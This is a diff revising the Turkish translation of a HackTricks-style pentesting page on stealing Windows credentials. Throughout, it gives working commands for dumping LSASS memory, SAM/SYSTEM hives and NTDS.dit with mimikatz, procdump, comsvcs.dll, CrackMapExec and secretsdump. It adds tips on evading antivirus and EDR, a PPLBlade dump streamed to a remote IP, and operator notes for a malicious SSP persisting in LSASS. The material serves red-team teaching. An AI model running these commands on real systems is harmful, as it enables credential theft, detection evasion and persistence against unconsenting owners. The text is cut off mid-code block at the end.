@@ -1,4 +1,4 @@
-# Windows Kimlik Bilgilerini Ele Geçirme
+# Windows Kimlik Bilgilerini Çalma
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -18,7 +18,7 @@ lsadump::sam
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
-**Mimikatz'in yapabileceği diğer şeyleri [bu sayfada](credentials-mimikatz.md) bulabilirsiniz.**
+**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**
 
 ### Invoke-Mimikatz
 
@@ -28,11 +28,11 @@ Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
 
-[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını engelleyebilir.**
+[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını önleyebilir.**
 
 ## Meterpreter ile Kimlik Bilgileri
 
-Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) aracını kullanın.
+Hedefin içinde **parola ve hash aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **aracını** kullanın.
 
 ```bash
 #Credentials from SAM
@@ -51,12 +51,12 @@ mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
 
-## AV'yi Atlatma
+## AV Atlatma
 
 ### Procdump + Mimikatz
 
-[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **Procdump meşru bir Microsoft aracı olduğundan**, Defender tarafından algılanmaz.\
-Bu aracı **lsass sürecinin dump'ını almak**, **dump'ı indirmek** ve dump'taki **kimlik bilgilerini yerel olarak çıkarmak** için kullanabilirsiniz.
+**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ten Procdump yasal bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmez.\
+Bu aracı **lsass sürecini dump'lamak**, **dump'ı indirmek** ve **kimlik bilgilerini dump'tan yerel olarak çıkarmak** için kullanabilirsiniz.
 
 [SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.
 
@@ -79,14 +79,14 @@ mimikatz # sekurlsa::logonPasswords
 
 Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Not**: Bazı **AV** yazılımları, **lsass.exe'yi dump etmek için procdump.exe kullanılmasını** **zararlı** olarak **tespit edebilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu nedenle, **procdump'a** `lsass.exe` **adını vermek yerine** lsass.exe'nin **PID'sini argüman** olarak **iletmek** daha **gizlidir**.
+**Not**: Bazı **AV** çözümleri, **lsass.exe'yi dump etmek için procdump.exe kullanımını** **zararlı** olarak **algılayabilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **algılamalarıdır**. Bu nedenle, **lsass.exe adını** kullanmak **yerine**, lsass.exe'nin **PID** değerini **argüman** olarak **procdump'a iletmek** daha **gizli** bir yöntemdir.
 
 ### **comsvcs.dll** ile lsass dump etme
 
-`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **process belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **işlev** içerir.\
-İlk iki argümanın kullanılması önemli değildir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni oluşturur; üçüncü bileşen ise kesinlikle **full** sözcüğü olmalıdır. Başka seçenek yoktur.\
+`C:\Windows\System32` konumunda bulunan **comsvcs.dll** adlı DLL, bir çökme durumunda **process memory dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
+İlk iki argümanın kullanılması önemli değildir; üçüncü argüman ise üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni, üçüncü bileşen ise yalnızca **full** sözcüğünü oluşturur. Başka seçenek yoktur.\
 Bu üç bileşen ayrıştırıldıktan sonra DLL, dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
-**comsvcs.dll** kullanılarak lsass process'i dump edilebilir; böylece procdump'ı yükleyip çalıştırmaya gerek kalmaz. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>
+**comsvcs.dll**, lsass process'ini dump etmek için kullanılabilir; böylece procdump'ı yükleyip çalıştırma gereği ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>
 
 Çalıştırmak için aşağıdaki komut kullanılır:
 
@@ -98,92 +98,92 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### **Task Manager ile lsass dökümü alma**
 
-1. Task Bar'a sağ tıklayın ve Task Manager'a tıklayın.
-2. More details'a tıklayın.
-3. Processes sekmesinde "Local Security Authority Process" sürecini bulun.
-4. "Local Security Authority Process" sürecine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.
+1. Görev çubuğuna sağ tıklayın ve Task Manager'a tıklayın
+2. More details'a tıklayın
+3. Processes sekmesinde "Local Security Authority Process" işlemini bulun
+4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file"a tıklayın.
 
 ### procdump ile lsass dökümü alma
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir binary'dir.
 
-Önceden oluşturulmuş tam sistem çökme dökümü veya erişilebilir bir kullanıcı klasöründeki sıkıştırılmış kopyası, çevrimdışı analiz için kimlik bilgisi materyali içerebilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme için ipucu niteliğindedir: kaynağını ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.
+Önceden oluşturulmuş bir tam sistem çökme dökümü veya erişilebilir bir kullanıcı klasöründe sıkıştırılmış bir kopya, çevrimdışı analiz için kimlik bilgisi materyali içerebilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme ipuçlarıdır: kaynağını ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.
 
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 
-## PPLBlade ile lsass Dumping
+## PPLBlade ile lsass dökümü alma
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske kaydetmeden uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü obfuscate etmeyi ve diske yazmadan uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.
 
 **Temel işlevler**:
 
 1. PPL korumasını atlatma
-2. Defender'ın imza tabanlı algılama mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
-3. Bellek dump'ını diske kaydetmeden RAW ve SMB yükleme yöntemleriyle yükleme (fileless dump)
+2. Defender'ın imza tabanlı algılama mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
+3. Bellek dökümünü diske yazmadan RAW ve SMB yükleme yöntemleriyle yükleme (fileless dump)
 
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 
-## LalsDumper – MiniDumpWriteDump kullanmadan SSP tabanlı LSASS dökümü alma
+## LalsDumper – MiniDumpWriteDump kullanmadan SSP tabanlı LSASS dökümü
 
-Ink Dragon, `MiniDumpWriteDump` işlevini hiç çağırmayan ve bu nedenle bu API üzerindeki EDR hook’larını tetiklemeyen, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>
+Ink Dragon, `MiniDumpWriteDump` çağrısı yapmayan ve bu nedenle bu API üzerindeki EDR hook'larını hiç tetiklemeyen, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>
 
-1. **Aşama 1 yükleyicisi (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir yer tutucu arar, bu yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL’yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Böylece **LSASS**, kötü amaçlı DLL’yi yeni bir Security Support Provider (SSP) olarak yüklemeye zorlanır.
-2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her baytı `0x20` ile XOR’lar ve yürütmeyi devretmeden önce kodu çözülmüş blob’u belleğe eşler.
-3. **Aşama 3 dumper** – Eşlenen payload, hash’lenmiş API adlarından çözümlenen **doğrudan syscall**’ları kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış LSASS dökümünü dosyaya yazar ve handle’ı kapatır; böylece veri daha sonra dışarı sızdırılabilir.
+1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL'yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Böylece **LSASS**, kötü amaçlı DLL'yi yeni bir Security Support Provider (SSP) olarak yükler.
+2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her baytı `0x20` ile XOR'lar ve yürütmeyi devretmeden önce çözülen blob'u belleğe eşler.
+3. **Aşama 3 dumper** – Belleğe eşlenen payload, hash'lenmiş API adlarından çözümlenen **doğrudan syscall**'ları kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dökümünü dosyaya yazar ve handle'ı kapatır; böylece daha sonra exfiltration yapılabilir.
 
 Operatör notları:
 
-* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, sabit kodlanmış yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir; bu nedenle dosyaları farklı konumlara koymak zinciri bozar.
-* Kayıt, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle yapılır. LSASS’in SSP’yi her açılışta yeniden yüklemesini sağlamak için bu değeri kendiniz ekleyebilirsiniz.
-* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Sıkıştırmayı yerel olarak açın, ardından kimlik bilgilerini çıkarmak için dosyaları Mimikatz/Volatility araçlarına verin.
-* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe` yönetici/SeTcb haklarıyla çalıştırılmalıdır; çağrı döndüğünde LSASS, kötü amaçlı SSP’yi şeffaf biçimde yükler ve Aşama 2’yi yürütür.
-* DLL’yi diskten silmek, onu LSASS’ten kaldırmaz. Kayıt defteri girdisini silip LSASS’i yeniden başlatın (sistemi yeniden başlatın) ya da uzun süreli kalıcılık için olduğu gibi bırakın.
+* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, sabit kodlanmış yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir; bu nedenle dosyaları ayırmak zinciri bozar.
+* Kayıt işlemi, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle gerçekleşir. LSASS'in SSP'yi her açılışta yeniden yüklemesi için bu değeri kendiniz ekleyebilirsiniz.
+* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Dosyaları yerel olarak açın, ardından kimlik bilgilerini çıkarmak için Mimikatz/Volatility'ye verin.
+* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe` yönetici/SeTcb haklarıyla çalıştırılmalıdır; çağrı döndükten sonra LSASS, sahte SSP'yi şeffaf biçimde yükler ve Aşama 2'yi yürütür.
+* DLL'yi diskten silmek, onu LSASS'ten çıkarmaz. Ya kayıt defteri girdisini silip LSASS'i yeniden başlatın (bilgisayarı yeniden başlatın) ya da uzun süreli kalıcılık için olduğu gibi bırakın.
 
 ## CrackMapExec
 
-### SAM hash’lerini dökme
+### SAM hash'lerini dök
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 
-### LSA secrets dökümü
+### Dump LSA secrets
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 
-### Hedef DC'den NTDS.dit'i döküm olarak al
+### Hedef DC'den NTDS.dit dökümünü al
 
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-### Hedef DC'den NTDS.dit parola geçmişini dökme
+### Hedef DC'den NTDS.dit parola geçmişini dök
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
 
-### Her NTDS.dit hesabının pwdLastSet özniteliğini göster
+### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-## SAM ve SYSTEM'i Çalma
+## SAM ve SYSTEM Dosyalarını Çalma
 
-Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korunduklarından bunları normal şekilde kopyalayamazsınız**.
+Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korundukları için bunları normal bir şekilde kopyalayamazsınız**.
 
 ### Registry'den
 
-Bu dosyaları çalmanın en kolay yolu, Registry'den bir kopya almaktır:
+Bu dosyaları ele geçirmenin en kolay yolu, Registry'den bir kopya almaktır:
 
 ```
 reg save HKLM\sam sam
@@ -191,7 +191,7 @@ reg save HKLM\system system
 reg save HKLM\security security
 ```
 
-**Bu dosyaları** Kali makinenize **indirin** ve aşağıdakini kullanarak **hash'leri çıkarın**:
+**Bu dosyaları** Kali makinenize **indirin** ve şu komutu kullanarak **hash'leri çıkarın**:
 
 ```
 samdump2 SYSTEM SAM
@@ -200,11 +200,11 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 ### Volume Shadow Copy
 
-Bu hizmeti kullanarak korumalı dosyaların kopyalarını oluşturabilirsiniz. Yönetici olmanız gerekir.
+Bu hizmeti kullanarak korumalı dosyaları kopyalayabilirsiniz. Yönetici olmanız gerekir.
 
 #### vssadmin kullanımı
 
-vssadmin yürütülebilir dosyası yalnızca Windows Server sürümlerinde kullanılabilir.
+vssadmin ikilisi yalnızca Windows Server sürümlerinde kullanılabilir.
 
 ```bash
 vssadmin create shadow /for=C:
@@ -219,7 +219,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
-Ancak aynı şeyi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağına** dair bir örnektir (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydedilir), ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
+Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Aşağıda **SAM dosyasının nasıl kopyalanacağına** dair bir örnek verilmiştir (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydediliyor), ancak bunu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
 
 ```bash
 $service=(Get-Service -name VSS)
@@ -236,7 +236,7 @@ Kitaptaki kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistem
 
 ### Invoke-NinjaCopy
 
-Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.
+Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) dosyasını da kullanabilirsiniz.
 
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
@@ -244,29 +244,29 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 ## **Active Directory Kimlik Bilgileri - NTDS.dit**
 
-**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri barındıran **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarının **password hash**'leri burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
+**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve üyelikleri hakkında önemli veriler içerir. Etki alanı kullanıcılarına ait **password hash**'leri burada depolanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
 
 Bu veritabanında üç temel tablo tutulur:
 
-- **Data Table**: Kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları saklamakla görevlidir.
-- **Link Table**: Grup üyelikleri gibi ilişkileri izler.
-- **SD Table**: Her nesnenin **security descriptor**'ları burada tutulur ve saklanan nesnelerin güvenliği ile erişim denetimi sağlanır.
+- **Data Table**: Kullanıcılar ve gruplar gibi nesnelerin ayrıntılarını depolar.
+- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
+- **SD Table**: Her nesneye ait **security descriptor**'lar burada tutulur ve depolanan nesnelerin güvenliği ile erişim denetimi sağlanır.
 
-Christoffer Andersson'ın veritabanı katmanına ilişkin araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı olarak belgeliyor.<sup>[[8]](#references)</sup>
+Christoffer Andersson'ın veritabanı katmanına ilişkin araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı biçimde belgeliyor.<sup>[[8]](#references)</sup>
 
-Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir **bölümü** **`lsass` belleğinde** bulunabilir (performansı artırmak için **cache** kullanılması sayesinde muhtemelen en son erişilen verileri bulabilirsiniz).
+Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından **NTDS.dit** dosyasının bir **kısmı**, **`lsass` belleğinde** bulunabilir (muhtemelen performansı artırmak için bir **cache** kullanıldığından, en son erişilen verileri bulabilirsiniz).
 
-#### NTDS.dit içindeki hash'lerin şifresini çözme
+#### NTDS.dit içindeki hash'leri çözme
 
-Hash üç kez şifrelenir:
+Hash üç kez şifrelenmiştir:
 
-1. Password Encryption Key (**PEK**) anahtarının şifresini **BOOTKEY** ve **RC4** kullanarak çözün.
-2. **Hash**'in şifresini **PEK** ve **RC4** kullanarak çözün.
-3. **Hash**'in şifresini **DES** kullanarak çözün.
+1. **BOOTKEY** ve **RC4** kullanarak Password Encryption Key (**PEK**) şifrelemesini çözün.
+2. **PEK** ve **RC4** kullanarak **hash** şifrelemesini çözün.
+3. **DES** kullanarak **hash** şifrelemesini çözün.
 
-**PEK**, her etki alanı denetleyicisinde **aynı değere** sahiptir; ancak bu anahtar, ilgili etki alanı denetleyicisinin **SYSTEM** hive'ındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde **şifrelenir**. Bu nedenle kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.
+**PEK**, her etki alanı denetleyicisinde **aynı değere** sahiptir; ancak bu değer, ilgili etki alanı denetleyicisinin **SYSTEM** kayıt kovanındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde **şifrelenir**. Bu nedenle, kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.
 
-### Ntdsutil kullanarak NTDS.dit dosyasını kopyalama
+### Ntdsutil kullanarak NTDS.dit kopyalama
 
 Windows Server 2008'den beri kullanılabilir.
 
@@ -274,49 +274,49 @@ Windows Server 2008'den beri kullanılabilir.
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
 
-Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) yöntemini de kullanabilirsiniz. **SYSTEM file** dosyasının da bir kopyasına ihtiyacınız olacağını unutmayın (yine [**registry'den dökümünü alın veya volume shadow copy yöntemini kullanın**](#stealing-sam-and-system)).
+NTDS.dit dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) trick'ini de kullanabilirsiniz. **SYSTEM file**'ın da bir kopyasına ihtiyacınız olacağını unutmayın (yine [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) trick'ini kullanın).
 
 ### **NTDS.dit dosyasından hash'leri çıkarma**
 
-**NTDS.dit** ve **SYSTEM** dosyalarını **edindikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
+**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
 
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
 
-Bunları geçerli bir domain admin kullanıcısı kullanarak otomatik olarak da çıkarabilirsiniz:
+Geçerli bir domain admin kullanıcısı kullanarak bunları **otomatik olarak da çıkarabilirsiniz**:
 
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 
-**Büyük NTDS.dit dosyalarının** [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.
+**Büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmak önerilir.
 
 Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`
 
-### **NTDS.dit dosyasındaki domain nesnelerini bir SQLite veritabanına çıkarma**
+### **NTDS.dit dosyasındaki domain nesnelerini SQLite veritabanına çıkarma**
 
-NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Yalnızca sırlar değil, ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarmak için nesnelerin tamamı ve öznitelikleri de çıkarılır.
+NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası zaten elde edilmişse, daha fazla bilgi çıkarmak için yalnızca secrets değil, nesnelerin tamamı ve öznitelikleri de çıkarılır.
 
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
 
-`SYSTEM` hive isteğe bağlıdır ancak secrets şifre çözmeye olanak tanır (NT ve LM hash'leri, cleartext parolalar gibi ek kimlik bilgileri, kerberos veya trust anahtarları, NT ve LM parola geçmişleri). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hash'leriyle birlikte kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve parola değiştirme zaman damgaları, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyon birimlerinin ağacı ve üyelikleri, trust türü, yönü ve öznitelikleriyle birlikte güvenilen etki alanları...
+`SYSTEM` hive isteğe bağlıdır ancak secrets decryption işlemini mümkün kılar (NT ve LM hashes, cleartext passwords gibi supplemental credentials, kerberos veya trust keys, NT ve LM password histories). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hashes içeren user ve machine accounts, UAC flags, son logon ve password change zaman damgaları, account açıklamaları, adlar, UPN, SPN, groups ve recursive memberships, organizational units ağacı ve üyelikleri, trust türleri, yönü ve attributes bilgileriyle birlikte trusted domains...
 
 ## Lazagne
 
-Binary dosyasını [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary dosyasını çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
+Binary dosyasını [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary dosyasını çeşitli software’lerden credentials çıkarmak için kullanabilirsiniz.
 
 ```
 lazagne.exe all
 ```
 
-## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar
+## SAM ve LSASS'ten kimlik bilgilerini çıkarmaya yönelik diğer araçlar
 
 ### Windows credentials Editor (WCE)
 
-Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)
+Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
@@ -329,7 +329,7 @@ fgdump.exe
 
 ### PwDump
 
-SAM dosyasından kimlik bilgilerini çıkar
+SAM dosyasından kimlik bilgilerini çıkarın
 
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
@@ -339,15 +339,15 @@ type outpwdump
 
 ### PwDump7
 
-Buradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve yalnızca **çalıştırın**; parolalar çıkarılır.
+Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), ardından **çalıştırmanız** yeterlidir; parolalar çıkarılır.
 
-## Boşta kalan RDP oturumlarını inceleme ve güvenlik kontrollerini zayıflatma
+## Boştaki RDP oturumlarını inceleme ve güvenlik denetimlerini zayıflatma
 
-Ink Dragon’ın FinalDraft RAT’i, teknikleri tüm red-teamer’lar için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>
+Ink Dragon’ın FinalDraft RAT’inde, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker’ı bulunur:<sup>[[3]](#references)</sup>
 
 ### DumpRDPHistory tarzı telemetri toplama
 
-* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:
+* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. PowerShell ile FinalDraft’ın mantığını uygulayabilirsiniz:
 
   ```powershell
   Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -360,7 +360,7 @@ Ink Dragon’ın FinalDraft RAT’i, teknikleri tüm red-teamer’lar için kull
   }
   ```
 
-* **Gelen RDP kanıtları** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Olay Kimliklerini sorgulayın:
+* **Gelen RDP kanıtı** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Event ID'lerini sorgulayın:
 
   ```powershell
